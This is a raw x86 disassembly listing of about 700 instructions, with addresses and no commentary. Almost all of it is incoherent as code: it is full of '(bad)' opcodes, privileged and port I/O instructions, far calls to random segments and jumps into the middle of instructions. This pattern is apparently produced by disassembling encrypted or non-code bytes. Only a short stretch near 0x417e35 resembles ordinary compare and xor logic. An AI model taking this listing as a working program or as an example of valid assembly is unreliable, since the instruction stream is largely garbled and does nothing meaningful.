  4178b7:	icebp  
  4178b8:	mov    ebp,0x24304932
  4178bd:	(bad)  [edx]
  4178bf:	popf   
  4178c0:	jmp    0x417866
  4178c2:	mov    al,0xda
  4178c4:	dec    eax
  4178c5:	lds    ebx,FWORD PTR [edx-0x56d6c198]
  4178cb:	fs jns 0x417887
  4178ce:	jmp    0x4178b0
  4178d0:	das    
  4178d1:	mov    eax,0x7e4bb9c2
  4178d6:	add    ah,dh
  4178d8:	outs   dx,DWORD PTR ds:[esi]
  4178d9:	mov    edx,DWORD PTR [eax-0x56]
  4178dc:	xchg   BYTE PTR [edi+0x556be476],bh
  4178e2:	adc    dh,BYTE PTR [edx]
  4178e4:	loopne 0x417894
  4178e6:	inc    ecx
  4178e7:	pop    ebp
  4178e8:	es call 0x925f:0x74a9eb52
  4178f0:	push   esp
  4178f1:	jb     0x417916
  4178f3:	(bad)  
  4178f4:	or     eax,0xe215b3f7
  4178f9:	or     DWORD PTR [esp+ebp*2-0x6e],esi
  4178fd:	push   ss
  4178fe:	leave  
  4178ff:	push   eax
  417900:	jne    0x4178e1
  417902:	inc    eax
  417903:	mov    al,ds:0xdec07d20
  417908:	cwde   
  417909:	mov    bl,0x26
  41790b:	out    dx,eax
  41790c:	sti    
  41790d:	xchg   ebx,eax
  41790e:	cmp    BYTE PTR [edx+0x4de1e085],bl
  417914:	out    0x83,al
  417916:	jne    0x417939
  417918:	leave  
  417919:	iret   
  41791a:	push   es
  41791b:	pop    ds
  41791c:	xor    BYTE PTR [edx-0x50502ebe],cl
  417922:	push   edi
  417923:	and    cl,ah
  417925:	xchg   edi,edi
  417927:	data16 dec BYTE PTR [ecx]
  41792a:	and    esi,DWORD PTR [edx]
  41792c:	mov    esi,0xac3e6c8e
  417931:	(bad)
  417934:	mov    ds:0x7c8f1be5,eax
  417939:	push   edx
  41793a:	mov    dl,0x86
  41793c:	cmp    al,0xbd
  41793e:	mov    ah,0x5b
  417940:	stos   BYTE PTR es:[edi],al
  417941:	fbstp  TBYTE PTR [esi-0x90e6f58]
  417947:	xor    DWORD PTR [ecx-0x62],esi
  41794a:	je     0x417907
  41794c:	loopne 0x417921
  41794e:	cmp    eax,0xa75519f7
  417953:	sub    al,ah
  417955:	jg     0x417972
  417957:	jbe    0x417997
  417959:	popf   
  41795a:	push   cs
  41795b:	cdq    
  41795c:	add    al,0xe3
  41795e:	(bad)  
  41795f:	mov    dh,0x4d
  417961:	inc    esi
  417962:	cmova  edx,ebx
  417965:	mov    eax,0xb17dc7aa
  41796a:	pop    ebx
  41796b:	fcmovnb st,st(3)
  41796d:	ins    BYTE PTR es:[edi],dx
  41796e:	push   0xffffff94
  417970:	mov    dh,0xb8
  417972:	ret    0xe93a
  417975:	sbb    al,0x3a
  417977:	push   cs
  417978:	inc    edi
  417979:	push   0x36978859
  41797e:	repnz pusha 
  417980:	arpl   WORD PTR ds:0x77893242,sp
  417986:	out    dx,eax
  417987:	dec    edi
  417988:	ror    BYTE PTR [edx],cl
  41798a:	mov    WORD PTR [ebp-0x4d],es
  41798d:	jmp    0x417a02
  41798f:	das    
  417990:	adc    ah,BYTE PTR [eax-0x55]
  417993:	mov    bl,0x8c
  417995:	es int 0x14
  417998:	dec    edi
  417999:	aaa    
  41799a:	mov    al,0xb6
  41799c:	cli    
  41799d:	inc    eax
  41799e:	inc    edi
  41799f:	lds    edi,FWORD PTR [edi]
  4179a1:	sar    BYTE PTR [edi],cl
  4179a3:	inc    eax
  4179a4:	sbb    eax,0x969ad27c
  4179a9:	mov    dl,BYTE PTR [ecx]
  4179ab:	out    dx,eax
  4179ac:	inc    esi
  4179ad:	call   0x252d:0xadf2cd02
  4179b4:	dec    ebx
  4179b5:	cdq    
  4179b6:	xor    edi,DWORD PTR [ecx+0x5e]
  4179b9:	call   0x5bfd:0x35c5faa8
  4179c0:	mov    eax,ds:0x5d82fe44
  4179c5:	cmp    bl,ah
  4179c7:	push   edx
  4179c8:	ja     0x417a24
  4179ca:	mov    eax,0x60c8156
  4179cf:	adc    ecx,esi
  4179d1:	(bad)  
  4179d2:	dec    eax
  4179d3:	addr16 call 0x96316c46
  4179d9:	or     edx,DWORD PTR [ebx]
  4179db:	inc    edx
  4179dc:	mov    cl,0x24
  4179de:	sti    
  4179df:	mov    bh,0x8a
  4179e1:	pop    ebp
  4179e2:	lods   al,BYTE PTR ds:[esi]
  4179e3:	pop    es
  4179e4:	pusha  
  4179e5:	push   0x3e92e659
  4179ea:	push   esi
  4179eb:	inc    edi
  4179ec:	lods   al,BYTE PTR ds:[esi]
  4179ed:	add    al,0xff
  4179ef:	cmp    al,dh
  4179f1:	inc    edx
  4179f2:	mov    al,ds:0x838c49b1
  4179f7:	sti    
  4179f8:	in     eax,dx
  4179f9:	fadd   QWORD PTR [ebp+0x15]
  4179fc:	scas   eax,DWORD PTR es:[edi]
  4179fd:	ss push es
  4179ff:	mov    al,0xef
  417a01:	inc    eax
  417a02:	mov    dh,0x27
  417a04:	push   0x4e43362d
  417a09:	outs   dx,DWORD PTR ds:[esi]
  417a0a:	fstp   TBYTE PTR [ecx]
  417a0c:	inc    edx
  417a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a0e:	push   ds
  417a0f:	push   edi
  417a10:	inc    ebp
  417a11:	or     al,0xe2
  417a13:	(bad)  
  417a14:	sti    
  417a15:	mov    ds,WORD PTR [ebp-0x40]
  417a18:	sbb    al,0x76
  417a1a:	das    
  417a1b:	jae    0x417a8e
  417a1d:	and    esi,ecx
  417a1f:	inc    eax
  417a20:	inc    esp
  417a21:	fmul   DWORD PTR [esi-0x66]
  417a24:	jg     0x417a22
  417a26:	not    DWORD PTR [esi-0x4e253ca6]
  417a2c:	jnp    0x417a73
  417a2e:	xchg   esp,eax
  417a2f:	adc    dh,BYTE PTR [edi-0x2dabbcd2]
  417a35:	loope  0x4179df
  417a37:	mov    ah,ch
  417a39:	hlt    
  417a3a:	ss enter 0x8d6f,0xc3
  417a3f:	push   ebp
  417a40:	in     eax,dx
  417a41:	jae    0x417a5a
  417a43:	mov    dh,BYTE PTR [ebx+0x5f]
  417a46:	sub    BYTE PTR [edx+esi*8+0x7f8b0fa0],dl
  417a4d:	or     BYTE PTR [eax],al
  417a4f:	hlt    
  417a50:	jg     0x417a3f
  417a52:	daa    
  417a53:	jl     0x417a3f
  417a55:	mov    DWORD PTR [esi],esp
  417a57:	jnp    0x417a9d
  417a59:	xlat   BYTE PTR ds:[ebx]
  417a5a:	or     al,BYTE PTR [ecx-0xd]
  417a5d:	push   edi
  417a5e:	ins    BYTE PTR es:[edi],dx
  417a5f:	call   0x8310:0x5fe5c9f0
  417a66:	into   
  417a67:	jecxz  0x417a33
  417a69:	inc    ebx
  417a6a:	js     0x417a96
  417a6c:	jp     0x417a48
  417a6e:	in     eax,dx
  417a6f:	push   esp
  417a70:	hlt    
  417a71:	mov    esi,0x83b3084e
  417a76:	xor    al,0x4b
  417a78:	ffree  st(4)
  417a7a:	aad    0xd2
  417a7c:	sar    BYTE PTR [edi-0x6e518ef2],1
  417a82:	xor    DWORD PTR [edi],edi
  417a84:	dec    edx
  417a85:	scas   eax,DWORD PTR es:[edi]
  417a86:	push   esp
  417a87:	std    
  417a88:	aam    0xa9
  417a8a:	stos   DWORD PTR es:[edi],eax
  417a8b:	mov    ds:0x764a157b,al
  417a90:	jg     0x417ad2
  417a92:	push   ds
  417a93:	lea    ebx,[edi]
  417a95:	scas   eax,DWORD PTR es:[edi]
  417a96:	add    esp,esp
  417a98:	sti    
  417a99:	inc    eax
  417a9a:	mov    eax,0xbf7ba358
  417a9f:	pop    ds
  417aa0:	int3   
  417aa1:	imul   ecx,DWORD PTR [edi+0x4],0x7ee2a2c8
  417aa8:	loope  0x417add
  417aaa:	leave  
  417aab:	nop
  417aac:	inc    ecx
  417aad:	arpl   WORD PTR [edx+0x12fb4ad3],sp
  417ab3:	xor    DWORD PTR [eax],edx
  417ab5:	dec    esp
  417ab6:	jecxz  0x417a98
  417ab8:	mov    eax,0xbaab0a52
  417abd:	mov    fs,WORD PTR [edi]
  417abf:	cmc    
  417ac0:	mov    ds:0x19960449,eax
  417ac5:	dec    esp
  417ac6:	(bad)  
  417ac7:	lds    edi,FWORD PTR [edx]
  417ac9:	cmp    DWORD PTR [ecx+esi*8],edx
  417acc:	cmovl  esi,DWORD PTR [esi-0x2a1afce1]
  417ad3:	pusha  
  417ad4:	sub    al,BYTE PTR [edi+edi*4]
  417ad7:	sub    bh,BYTE PTR [esi-0x74e97c7f]
  417add:	cmp    cl,bh
  417adf:	pop    ecx
  417ae0:	mul    bh
  417ae2:	repz in eax,dx
  417ae4:	adc    eax,ecx
  417ae6:	dec    ebp
  417ae7:	adc    dh,bh
  417ae9:	mov    al,ds:0x987533a9
  417aee:	adc    esi,esi
  417af0:	rdpmc  
  417af2:	add    al,0x42
  417af4:	out    dx,al
  417af5:	dec    dh
  417af7:	clc    
  417af8:	dec    edi
  417af9:	xchg   edi,eax
  417afa:	fcomp  DWORD PTR [edi]
  417afc:	pop    esp
  417afd:	adc    dl,BYTE PTR [ebx+0x6f]
  417b00:	int3   
  417b01:	enter  0x7721,0x80
  417b05:	sahf   
  417b06:	(bad)  
  417b08:	xchg   ecx,eax
  417b09:	das    
  417b0a:	dec    edi
  417b0b:	push   0x9
  417b0d:	mov    ebx,0xa0394bf7
  417b12:	push   0xcec9f4f6
  417b17:	int    0x6c
  417b19:	cmp    eax,0x31f3d590
  417b1e:	rcr    esi,cl
  417b20:	xchg   ebp,eax
  417b21:	push   ebp
  417b22:	lods   eax,DWORD PTR ds:[esi]
  417b23:	mov    edx,0x7ec30387
  417b28:	mov    edi,0x7c601df9
  417b2d:	gs ret 0x6948
  417b31:	or     BYTE PTR [ebp+edi*2-0x22caa444],al
  417b38:	pop    ecx
  417b39:	scas   eax,DWORD PTR es:[edi]
  417b3a:	push   es
  417b3b:	pop    es
  417b3c:	retf   
  417b3d:	add    BYTE PTR [ebx+0x15e9cb09],0xb6
  417b44:	stc    
  417b45:	shr    BYTE PTR [edi],0x56
  417b48:	sbb    BYTE PTR [eax-0x725019a1],0xe1
  417b4f:	aad    0x21
  417b51:	xor    DWORD PTR [edx+0x51],0x99bf8bf0
  417b58:	mov    ah,0x5c
  417b5a:	add    BYTE PTR [ecx],dl
  417b5c:	enter  0x24b3,0x73
  417b60:	dec    esi
  417b61:	jbe    0x417b9f
  417b63:	push   cs
  417b64:	dec    edi
  417b65:	or     al,0xd0
  417b67:	mov    BYTE PTR [ecx],bl
  417b69:	mov    ch,0x19
  417b6b:	push   ss
  417b6c:	and    DWORD PTR [ebx+ebx*2+0x6211e65f],0x89bbb83d
  417b77:	sbb    ebp,esp
  417b79:	push   eax
  417b7a:	icebp  
  417b7b:	xchg   esi,eax
  417b7c:	add    eax,0x529af0d6
  417b81:	cmp    al,0x73
  417b83:	and    al,0x4c
  417b85:	je     0x417b58
  417b87:	retf   0x4a42
  417b8a:	mov    bh,0x6b
  417b8c:	fst    DWORD PTR [edi+edi*1-0x5f06dc79]
  417b93:	adc    edx,DWORD PTR [edi+0x4d]
  417b96:	(bad)  
  417b97:	ss jle 0x417be6
  417b9a:	xchg   ebp,eax
  417b9b:	push   ds
  417b9c:	(bad)  [eax+eiz*1-0x78]
  417ba0:	(bad)  
  417ba2:	sbb    eax,ebx
  417ba4:	enter  0xb746,0xbc
  417ba8:	daa    
  417ba9:	inc    esp
  417baa:	fbld   TBYTE PTR [ebp-0x5a]
  417bad:	clc    
  417bae:	mov    di,0xd851
  417bb2:	popf   
  417bb3:	imul   eax,DWORD PTR [eax+ecx*4+0x51],0xffffffbd
  417bb8:	adc    al,0xe4
  417bba:	popa   
  417bbb:	sbb    edi,DWORD PTR [eax-0x6b937f67]
  417bc1:	repnz xchg ebx,eax
  417bc3:	or     eax,0x6bee6965
  417bc8:	enter  0x1a0e,0xee
  417bcc:	inc    ebp
  417bcd:	pop    ds
  417bce:	mov    BYTE PTR [ebp+edi*8+0x54681576],0x15
  417bd6:	clc    
  417bd7:	ficomp WORD PTR ss:[edi+0x55]
  417bdb:	xor    ebp,DWORD PTR [edx-0x56]
  417bde:	es pop edi
  417be0:	sbb    DWORD PTR [ecx+0x7c],edi
  417be3:	adc    BYTE PTR [edi],dl
  417be5:	cld    
  417be6:	pop    edx
  417be7:	push   cs
  417be8:	sub    eax,0x76f2712
  417bed:	test   eax,0xf8e3c4b6
  417bf2:	imul   esi,ecx,0xffffffe0
  417bf5:	mov    esp,0xd4787e31
  417bfa:	cmp    al,BYTE PTR [ebp+0xf]
  417bfd:	fwait
  417bfe:	sbb    eax,0x5829dd8
  417c03:	push   esi
  417c04:	mov    ch,BYTE PTR [esi+0x36ad3f3d]
  417c0a:	mov    DWORD PTR [edi+0x46],ebp
  417c0d:	js     0x417bec
  417c0f:	mov    al,0x35
  417c11:	push   es
  417c12:	int    0xa8
  417c14:	cmp    eax,0xa46fea54
  417c19:	and    DWORD PTR [esi],ecx
  417c1b:	loope  0x417bb5
  417c1d:	fbld   TBYTE PTR [esi]
  417c1f:	(bad)  
  417c20:	pop    edx
  417c21:	and    BYTE PTR [eax],0x60
  417c24:	into   
  417c25:	xor    eax,0xa0779c33
  417c2a:	inc    eax
  417c2b:	dec    edi
  417c2c:	xchg   DWORD PTR [ecx+0x4686ff7a],esp
  417c32:	les    ecx,FWORD PTR [edx-0x2bca75c3]
  417c38:	inc    ebx
  417c39:	(bad)  
  417c3a:	pop    esi
  417c3b:	inc    esi
  417c3c:	lods   eax,DWORD PTR ds:[esi]
  417c3d:	and    ecx,0xa3712783
  417c43:	dec    edx
  417c44:	pop    ds
  417c45:	ret    
  417c46:	mov    eax,0xabfa3fcb
  417c4b:	ret    0x4899
  417c4e:	or     al,0x7c
  417c50:	loopne 0x417c96
  417c52:	shr    DWORD PTR [ecx+0x1d],1
  417c55:	sub    cl,bl
  417c57:	into   
  417c58:	mov    DWORD PTR [esi],esp
  417c5a:	jnp    0x417c85
  417c5c:	xchg   ebp,eax
  417c5d:	(bad)  
  417c5e:	xor    bh,dh
  417c60:	xchg   ecx,eax
  417c61:	in     al,dx
  417c62:	ficomp DWORD PTR [ebx-0x1296448b]
  417c68:	es ret 
  417c6a:	retf   0x896d
  417c6d:	adc    esp,ebp
  417c6f:	imul   edx
  417c71:	jb     0x417c81
  417c73:	nop
  417c74:	icebp  
  417c75:	out    0x33,al
  417c77:	pop    edi
  417c78:	mov    bh,0xdc
  417c7a:	int3   
  417c7b:	fs (bad) 
  417c7e:	mov    ds:0xa65f2f73,al
  417c83:	mov    bh,0xc1
  417c85:	(bad)  
  417c86:	and    al,0xbf
  417c88:	std    
  417c89:	ret    
  417c8a:	xor    al,0x77
  417c8c:	fmul   DWORD PTR [ebp-0xa]
  417c8f:	pop    ecx
  417c90:	cld    
  417c91:	push   ds
  417c92:	sbb    DWORD PTR [eax],eax
  417c94:	(bad)  
  417c95:	pop    edx
  417c96:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417c98:	mov    al,ds:0xf24f28c9
  417c9d:	cmp    dh,BYTE PTR [bp+di]
  417ca0:	add    eax,0x3df3809e
  417ca5:	rcr    DWORD PTR [edx],1
  417ca7:	and    dl,dh
  417ca9:	pop    ds
  417caa:	jl     0x417cc0
  417cac:	or     ch,ch
  417cae:	sub    dl,0x4
  417cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb2:	in     al,dx
  417cb3:	cmc    
  417cb4:	sahf   
  417cb5:	cmc    
  417cb6:	push   es
  417cb7:	fisub  DWORD PTR [edi+0x67]
  417cba:	clc    
  417cbb:	rcr    edi,cl
  417cbd:	(bad)  
  417cbe:	cdq    
  417cbf:	xchg   DWORD PTR [ebx+eiz*1-0x1dd8ec50],ebp
  417cc6:	cmp    al,0x96
  417cc8:	adc    eax,0xaec37b77
  417ccd:	sub    BYTE PTR [ebp-0x338420da],ch
  417cd3:	cmp    ecx,DWORD PTR [eax]
  417cd5:	xor    eax,0xa5ab34b5
  417cda:	clc    
  417cdb:	push   esi
  417cdc:	rol    BYTE PTR [ecx-0x15],1
  417cdf:	jle    0x417ce2
  417ce1:	pop    ecx
  417ce2:	ss mov eax,fs
  417ce5:	ja     0x417c83
  417ce7:	push   ss
  417ce8:	cli    
  417ce9:	push   ss
  417cea:	loop   0x417c6c
  417cec:	cmp    BYTE PTR [eax],ah
  417cee:	and    DWORD PTR [esi-0x2ddf25d9],edi
  417cf4:	mov    esi,0xaadff5d
  417cf9:	dec    ebp
  417cfa:	add    eax,0xf64ec391
  417cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d00:	add    BYTE PTR [ecx],bl
  417d02:	mov    bl,0x76
  417d04:	imul   eax,DWORD PTR [edi],0x12d1961a
  417d0a:	cmp    al,bh
  417d0c:	mov    bl,0xba
  417d0e:	jno    0x417cd2
  417d10:	aam    0xdf
  417d12:	ins    DWORD PTR es:[edi],dx
  417d13:	fnstenv [ebx-0x5a]
  417d16:	sahf   
  417d17:	jnp    0x417cdc
  417d19:	(bad)
  417d1c:	sbb    bl,ch
  417d1e:	mov    ds:0x2392f762,al
  417d23:	jo     0x417d6b
  417d25:	das    
  417d26:	sbb    BYTE PTR [eax],al
  417d28:	outs   dx,BYTE PTR ds:[esi]
  417d29:	into   
  417d2a:	sbb    DWORD PTR [edi],ebx
  417d2c:	fsubr  DWORD PTR [edx+ebp*4+0x77110faf]
  417d33:	jbe    0x417d81
  417d35:	mov    ecx,0xfb366a4a
  417d3a:	outs   dx,DWORD PTR ds:[esi]
  417d3b:	test   DWORD PTR [ecx+0x7488ee41],edx
  417d41:	mov    eax,?
  417d43:	jp     0x417cf3
  417d45:	pop    edx
  417d46:	out    dx,eax
  417d47:	imul   esp,DWORD PTR [ebx],0x92ec8b39
  417d4d:	dec    esp
  417d4e:	dec    esi
  417d4f:	fndisi(8087 only) 
  417d51:	mov    ebx,0xe04434b6
  417d56:	ret    0x4b43
  417d59:	or     BYTE PTR [ecx],al
  417d5b:	adc    BYTE PTR [esi],0x6a
  417d5e:	jg     0x417d28
  417d60:	inc    ebp
  417d61:	fsub   QWORD PTR [eax+0x5d]
  417d64:	int3   
  417d65:	mov    ch,0xa4
  417d67:	jno    0x417d87
  417d69:	retf   
  417d6a:	test   eax,0x618e6592
  417d6f:	add    DWORD PTR [eax],0xcb357ae4
  417d75:	mov    bh,0x6
  417d77:	pusha  
  417d78:	push   edx
  417d79:	adc    ch,BYTE PTR [ebp-0x532df697]
  417d7f:	icebp  
  417d80:	jmp    0xf777ab6c
  417d85:	mov    ds:0x7d160ef9,eax
  417d8a:	push   edi
  417d8b:	mov    ch,0x86
  417d8d:	jnp    0x417df9
  417d8f:	sar    BYTE PTR [esi+0x4e],cl
  417d92:	pop    es
  417d93:	xor    esp,DWORD PTR [edi]
  417d95:	loopne 0x417e0d
  417d97:	xor    dl,0x49
  417d9a:	bound  edx,QWORD PTR [eax]
  417d9c:	pop    es
  417d9d:	adc    DWORD PTR [ebp-0x1e],ecx
  417da0:	aam    0x6e
  417da2:	call   0x61413e67
  417da7:	aam    0xe1
  417da9:	aad    0xd2
  417dab:	retf   0x57fa
  417dae:	sti    
  417daf:	xor    BYTE PTR [edx+edx*1],0x6b
  417db3:	and    eax,0xb629d5d5
  417db8:	jbe    0x417df6
  417dba:	int3   
  417dbb:	mov    ah,0x5a
  417dbd:	jg     0x417dab
  417dbf:	sbb    eax,eax
  417dc1:	or     BYTE PTR [esi],dh
  417dc3:	lock lds ecx,FWORD PTR [ecx+0x16]
  417dc7:	cdq    
  417dc8:	in     al,0xdc
  417dca:	or     al,0xc4
  417dcc:	and    eax,edi
  417dce:	iret   
  417dcf:	mov    cl,ch
  417dd1:	dec    eax
  417dd2:	mov    esp,es
  417dd4:	dec    ebp
  417dd5:	sbb    al,0xda
  417dd7:	aaa    
  417dd8:	stos   BYTE PTR es:[edi],al
  417dd9:	int3   
  417dda:	not    dh
  417ddc:	nop
  417ddd:	xchg   edx,eax
  417dde:	shl    BYTE PTR [ebx+eax*2-0x7d5e1488],0xe0
  417de6:	mov    esp,0x520b120e
  417deb:	mov    ds,WORD PTR [esi]
  417ded:	repz cmp al,bh
  417df0:	jo     0x417d7d
  417df2:	shr    BYTE PTR [ebp-0x73],0xc
  417df6:	daa    
  417df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417df8:	adc    eax,0x2c534d04
  417dfd:	neg    BYTE PTR [eax]
  417dff:	mov    WORD PTR [ebx],cs
  417e01:	aas    
  417e02:	aas    
  417e03:	sub    DWORD PTR [edx-0x35],edi
  417e06:	xchg   ecx,eax
  417e07:	popf   
  417e08:	test   BYTE PTR [ebx-0x38],dh
  417e0b:	cdq    
  417e0c:	dec    esp
  417e0d:	(bad)  
  417e0e:	test   eax,0x33748855
  417e13:	iret   
  417e14:	cmc    
  417e15:	xchg   esp,eax
  417e16:	mov    al,ds:0xb26912ac
  417e1b:	loope  0x417e25
  417e1d:	out    0xf7,eax
  417e1f:	dec    esp
  417e20:	mul    BYTE PTR [ebp-0x556851b9]
  417e26:	dec    eax
  417e27:	sbb    al,0xd4
  417e29:	inc    esi
  417e2a:	int    0x8b
  417e2c:	dec    ebp
  417e2d:	loopne 0x417db9
  417e2f:	mov    WORD PTR ds:0xffffff5c,cs
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	(bad)  [ecx-0x21117723]
  417e63:	cmp    BYTE PTR [ebp+0x7a],bh
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e6c
  417e6b:	push   esi
  417e6c:	push   ecx
  417e6d:	sbb    esi,ebp
  417e6f:	and    ebp,ebx
  417e71:	or     ebx,DWORD PTR [eax-0xe807356]
  417e77:	jl     0x417e0b
  417e79:	(bad)  
  417e7a:	push   ds
  417e7b:	cmp    BYTE PTR [ebp+0x30],0x0
  417e7f:	bndstx [ebx+eax*4+0x49467ca8],(bad)
  417e87:	mov    edi,0xabadeabb
  417e8c:	pop    ds
  417e8d:	push   ebx
  417e8e:	jg     0x417ead
  417e90:	mov    edi,0xbec18998
  417e95:	cmp    edi,DWORD PTR [eax]
  417e97:	xor    ebp,ecx
  417e99:	dec    esp
  417e9a:	mov    dh,0xb3
  417e9c:	pusha  
  417e9d:	fisub  WORD PTR [esi-0x6d]
  417ea0:	mov    esi,0x7aa5b96d
  417ea5:	lock push ds
  417ea7:	mov    dh,0x30
  417ea9:	xor    al,0x84
  417eab:	jge    0x417e6d
  417ead:	(bad)  
  417eae:	ret    
  417eaf:	cmp    BYTE PTR [esi],0x47
  417eb2:	ret    0xaaaf
  417eb5:	call   0x1370:0x76085ad9
  417ebc:	jae    0x417f2f
  417ebe:	outs   dx,DWORD PTR ds:[si]
  417ec0:	ds inc edi
  417ec2:	outs   dx,BYTE PTR ds:[esi]
  417ec3:	jb     0x417f2e
  417ec5:	fsub   QWORD PTR [ecx-0x2e9197ea]
  417ecb:	jne    0x417e89
  417ecd:	int3   
  417ece:	cmp    eax,0xfe4ccc71
  417ed3:	cmp    eax,DWORD PTR [eax-0x70]
  417ed6:	dec    edx
  417ed7:	aam    0x31
  417ed9:	mov    ebx,0x55051b59
  417ede:	int    0x5
  417ee0:	fimul  WORD PTR [ecx]
  417ee2:	push   0x24d299bc
  417ee7:	es inc ebx
  417ee9:	add    dh,BYTE PTR [edi+0x2]
  417eec:	shr    edx,1
  417eee:	stos   DWORD PTR es:[edi],eax
  417eef:	cmp    cl,ch
  417ef1:	aad    0x97
  417ef3:	and    esi,DWORD PTR [ebx]
  417ef5:	rcr    DWORD PTR [edi+0x4e],0xc2
  417ef9:	add    eax,0xb426e0e1
  417efe:	push   0x855eebe3
  417f03:	aad    0x27
  417f05:	hlt    
  417f06:	nop
  417f07:	lods   al,BYTE PTR ds:[esi]
  417f08:	push   ecx
  417f09:	sub    BYTE PTR [eiz*1-0x405951b1],0x7e
  417f11:	aaa    
  417f12:	adc    dh,BYTE PTR [ebx]
  417f14:	sbb    al,0xe
  417f16:	mov    ah,0xce
  417f18:	xlat   BYTE PTR ds:[ebx]
  417f19:	pop    ebx
  417f1a:	mov    ecx,0x788ec5a8
  417f20:	jnp    0x417f73
  417f22:	mov    esp,0xe9ab6f3a
  417f27:	and    DWORD PTR [edi-0x74],edi
  417f2a:	sar    DWORD PTR [edi+edi*8],1
  417f2d:	sub    BYTE PTR [eax-0xfc6dd0],bl
  417f33:	sub    eax,0xfe973578
  417f38:	scas   eax,DWORD PTR es:[edi]
  417f39:	loop   0x417f18
  417f3b:	mov    cl,BYTE PTR [eax]
  417f3d:	xor    DWORD PTR [ebx-0x7c52a2e3],esp
  417f43:	pop    edx
  417f44:	inc    DWORD PTR [ebp+eiz*4-0x2d]
  417f48:	fist   WORD PTR [eax]
  417f4a:	fnstenv [edi]
  417f4c:	pop    ds
  417f4d:	test   DWORD PTR [ecx-0x5f492a6e],0x32a8e680
  417f57:	ret    0x35ae
  417f5a:	mov    ecx,0x269a19f5
  417f5f:	fidivr DWORD PTR [esi-0x612201b7]
  417f65:	aaa    
  417f66:	sub    DWORD PTR [esi],edi
  417f68:	add    cl,BYTE PTR [ebp+0x748b5113]
  417f6e:	add    cl,BYTE PTR [eax+0x5a]
  417f71:	add    al,0x46
  417f73:	inc    eax
  417f74:	jp     0x417fe5
  417f76:	test   DWORD PTR [edi+0xb],ecx
  417f79:	push   ecx
  417f7a:	jae    0x417fb9
  417f7c:	stos   BYTE PTR es:[edi],al
  417f7d:	pop    edx
  417f7e:	xchg   esi,eax
  417f7f:	jo     0x417f01
  417f81:	outs   dx,DWORD PTR ds:[esi]
  417f82:	je     0x417fbb
  417f84:	jecxz  0x417fa7
  417f86:	rol    bh,cl
  417f88:	mov    edx,DWORD PTR [edi]
  417f8a:	or     DWORD PTR [esi],esp
  417f8c:	push   ebp
  417f8d:	sbb    esp,DWORD PTR cs:[edx+0x3f]
  417f91:	mov    bh,0x1f
  417f93:	xchg   edx,eax
  417f94:	adc    al,0xc2
  417f96:	push   0xffffffae
  417f98:	sti    
  417f99:	aaa    
  417f9a:	xor    al,0xa2
  417f9c:	call   0x15fe:0x53068733
  417fa3:	lods   eax,DWORD PTR ds:[esi]
  417fa4:	fst    st(6)
  417fa6:	rcr    DWORD PTR [edi+0x79],0x61
  417faa:	jnp    0x417f8f
  417fac:	xor    dl,BYTE PTR [ecx-0x77]
  417faf:	in     al,0x85
  417fb1:	and    bh,bl
  417fb3:	push   ebp
  417fb4:	xchg   DWORD PTR [ebp-0x1ed8ac86],edx
  417fba:	dec    ecx
  417fbb:	or     eax,0x24ef79fe
  417fc0:	fdivp  st(6),st
  417fc2:	pop    ds
  417fc3:	xor    BYTE PTR [esi+0x2fb6df58],al
  417fc9:	xchg   esp,eax
  417fca:	cmp    eax,0xa7ff33df
  417fcf:	pop    esp
  417fd0:	dec    ecx
  417fd1:	inc    eax
  417fd2:	sub    eax,0x554178f1
  417fd7:	not    BYTE PTR ds:0xd31c5dca
  417fdd:	lods   eax,DWORD PTR ds:[esi]
  417fde:	mov    ecx,0xd4261be3
  417fe3:	adc    eax,0xcc4fb3a0
  417fe8:	sbb    DWORD PTR [edi-0x5e],ebp
  417feb:	mov    bh,0x17
  417fed:	sahf   
  417fee:	dec    edi
  417fef:	xor    DWORD PTR [ebx],ebx
  417ff1:	sbb    eax,0xc99ce59
  417ff6:	scas   al,BYTE PTR es:[edi]
  417ff7:	xchg   esp,eax
  417ff8:	mov    edi,0xf0336c45
  417ffd:	les    ebp,FWORD PTR [edx-0x235e9b2d]
  418003:	and    BYTE PTR [edx+0x12],al
  418006:	mov    esi,0xce33fd7f
  41800b:	repnz dec esi
  41800d:	jns    0x418014
  41800f:	fs scas eax,DWORD PTR es:[edi]
  418011:	xor    eax,0x5bd21917
  418016:	in     al,0x3
  418018:	(bad)  
  418019:	outs   dx,BYTE PTR ds:[esi]
  41801a:	mov    esp,eax
  41801c:	add    eax,0x86e2dab0
  418021:	jae    0x418038
  418023:	popf   
  418024:	lahf   
  418025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418026:	cmp    eax,0x4fe3e85e
  41802b:	cdq    
  41802c:	sub    eax,0xf6d99b22
  418031:	pop    edi
  418032:	repnz iret 
  418034:	mov    esi,DWORD PTR [ebx]
  418036:	sbb    ebx,esp
  418038:	add    al,0x75
  41803a:	lods   al,BYTE PTR ds:[esi]
  41803b:	retf   0x6236
  41803e:	jle    0x4180ad
  418040:	shl    dh,1
  418042:	sub    ah,BYTE PTR [ecx+0x4824ee9f]
  418048:	bnd jp 0x418091
  41804b:	in     al,0xb9
  41804d:	push   ecx
  41804e:	xor    DWORD PTR [ecx+0x42eb3745],0x7d
  418055:	jmp    0x417ff8
  418057:	div    BYTE PTR [ebx-0x45]
  41805a:	xor    cl,bh
  41805c:	add    eax,0x62d5af4e
  418061:	int    0x36
  418063:	push   ds
  418064:	pop    ebp
  418065:	pop    ecx
  418066:	or     dh,BYTE PTR [edi+0x13a7bd21]
  41806c:	stc    
  41806d:	mov    al,0xcb
  41806f:	jle    0x417ff4
  418071:	xchg   edx,eax
  418072:	retf   0xa48e
  418075:	sti    
